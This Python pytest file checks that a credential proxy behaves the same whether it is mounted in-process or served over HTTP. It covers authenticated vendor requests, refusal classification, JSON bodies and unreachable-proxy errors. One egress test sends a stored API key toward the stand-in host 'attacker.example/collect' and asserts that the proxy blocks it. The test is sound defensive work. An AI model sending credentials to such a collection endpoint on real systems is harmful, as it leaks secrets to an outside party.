"""FR-011. The ``dev`` mount and the ``standard`` service must behave identically.

The claim is easy to make and easy to get wrong, so this test does not assert it
by inspection. It stands up a real socket, serves the *same* ``ProxyApp`` object
over it, and drives one stack through both transports — checking that the vendor
sees the same authenticated request and that a refusal arrives classified the
same way through each.

The HTTP server here is forty lines of ``http.server`` rather than an ASGI
server, and that is deliberate. Pulling a production server into the test
dependencies to prove a wire format would test that server; this tests the wire
format. What matters is that bytes cross a socket, because the failure this
guards against is exactly the one that only appears when they do — an envelope
field that survives an in-process call and does not survive JSON.

The parity that matters is not "both work". It is that a refusal produces the
same reason, the same message, and the same classification either way — because
that is the difference between an operator debugging the credential and an
operator debugging the deployment profile.
"""

from __future__ import annotations

import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Any

import pytest

from config.constants.security import PROXY_FORWARD_PATH
from integrations._base.errors import IntegrationError
from integrations._base.transport import HttpProxyTransport, InProcessProxyTransport
from platform.credentials.proxy.app import ProxyApp
from platform.credentials.proxy.errors import ProxyErrorReason
from tests.unit.platform.credentials.conftest import Harness, json_response
from tests.unit.platform.credentials.test_proxy_engine import FIRST_KEY, request

pytestmark = pytest.mark.unit


def _serve(app: ProxyApp, loop: asyncio.AbstractEventLoop) -> ThreadingHTTPServer:
    """Return a started HTTP server carrying ``app`` on a loopback port.

    The handler thread hands each request to the caller's event loop rather than
    running its own, so the application under test is the same object the
    in-process transport drives — not a copy with its own state.
    """

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self) -> None:  # noqa: N802 — http.server dictates the name
            body = self.rfile.read(int(self.headers.get("content-length", 0)))
            status, payload = asyncio.run_coroutine_threadsafe(
                _call(app, self.path, body), loop
            ).result(timeout=10)
            self.send_response(status)
            self.send_header("content-type", "application/json")
            self.send_header("content-length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        def log_message(self, *args: Any) -> None:
            """Keep the suite's output about the suite."""

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


async def _call(app: ProxyApp, path: str, body: bytes) -> tuple[int, bytes]:
    """Run one ASGI cycle against ``app`` and return its status and body."""
    scope = {"type": "http", "method": "POST", "path": path, "headers": []}
    chunks: list[bytes] = []
    status = 500
    delivered = False

    async def receive() -> dict[str, Any]:
        nonlocal delivered
        if delivered:
            return {"type": "http.disconnect"}
        delivered = True
        return {"type": "http.request", "body": body, "more_body": False}

    async def send(message: dict[str, Any]) -> None:
        nonlocal status
        if message["type"] == "http.response.start":
            status = int(message["status"])
        elif message["type"] == "http.response.body":
            chunks.append(bytes(message.get("body", b"")))

    await app(scope, receive, send)  # type: ignore[arg-type]
    return status, b"".join(chunks)


@pytest.fixture
async def served(harness: Harness):
    """Yield the harness with its app also reachable over a loopback socket."""
    server = _serve(harness.app, asyncio.get_running_loop())
    try:
        yield harness, f"http://127.0.0.1:{server.server_address[1]}"
    finally:
        server.shutdown()
        server.server_close()


async def test_the_same_request_reaches_the_vendor_through_both_profiles(served) -> None:
    """One credential, two mount points, and the vendor cannot tell them apart."""
    harness, base_url = served
    await harness.vault.store(harness.scope(), harness.handle(), {"api_key": FIRST_KEY})
    harness.sender.responses.extend([json_response({"ok": True}), json_response({"ok": True})])

    in_process = await InProcessProxyTransport(harness.app).forward(request())
    over_http = await HttpProxyTransport(base_url=base_url).forward(request())

    assert in_process == over_http
    assert harness.sender.keys_seen() == (FIRST_KEY, FIRST_KEY)
    sent = harness.sender.sent
    assert sent[0].url == sent[1].url
    assert sent[0].headers == sent[1].headers


async def test_a_refusal_is_classified_the_same_way_through_both_profiles(served) -> None:
    """The parity that matters: the same error, not merely the same failure."""
    harness, base_url = served

    with pytest.raises(IntegrationError) as in_process:
        await InProcessProxyTransport(harness.app).forward(request())
    with pytest.raises(IntegrationError) as over_http:
        await HttpProxyTransport(base_url=base_url).forward(request())

    assert in_process.value.reason is over_http.value.reason
    assert in_process.value.proxy_reason is over_http.value.proxy_reason
    assert str(in_process.value) == str(over_http.value)
    assert in_process.value.proxy_reason is ProxyErrorReason.CREDENTIAL_NOT_CONFIGURED


async def test_an_egress_refusal_survives_the_wire_intact(served) -> None:
    harness, base_url = served
    await harness.vault.store(harness.scope(), harness.handle(), {"api_key": FIRST_KEY})

    with pytest.raises(IntegrationError) as raised:
        await HttpProxyTransport(base_url=base_url).forward(
            request(url="https://attacker.example/collect")
        )

    assert raised.value.proxy_reason is ProxyErrorReason.EGRESS_DENIED
    assert harness.sender.sent == []


async def test_a_body_survives_the_json_envelope(served) -> None:
    """The failure an in-process-only test cannot see: a field that does not encode."""
    harness, base_url = served
    await harness.vault.store(harness.scope(), harness.handle(), {"api_key": FIRST_KEY})
    harness.sender.responses.append(json_response({"ok": True}))

    outgoing = request(method="POST")
    posted = type(outgoing)(
        integration=outgoing.integration,
        org_id=outgoing.org_id,
        team_id=outgoing.team_id,
        capability=outgoing.capability,
        method="POST",
        url=outgoing.url,
        headers={"content-type": "application/json"},
        body=b'{"query": "status:error"}',
    )

    await HttpProxyTransport(base_url=base_url).forward(posted)

    assert harness.sender.sent[0].body == b'{"query": "status:error"}'
    assert harness.sender.sent[0].headers["content-type"] == "application/json"


async def test_an_unreachable_proxy_is_a_classified_failure_and_not_a_traceback() -> None:
    """SC-005 through the HTTP transport: no fallback, and a message that says so."""
    transport = HttpProxyTransport(base_url="http://127.0.0.1:1", timeout_seconds=1.0)

    with pytest.raises(IntegrationError) as raised:
        await transport.forward(request())

    assert "no path" in str(raised.value)
    assert raised.value.reason.value == "proxy_unavailable"


def test_the_forward_path_is_the_one_both_transports_use() -> None:
    """A constant, so the two cannot drift to different paths on the same app."""
    assert PROXY_FORWARD_PATH.startswith("/")
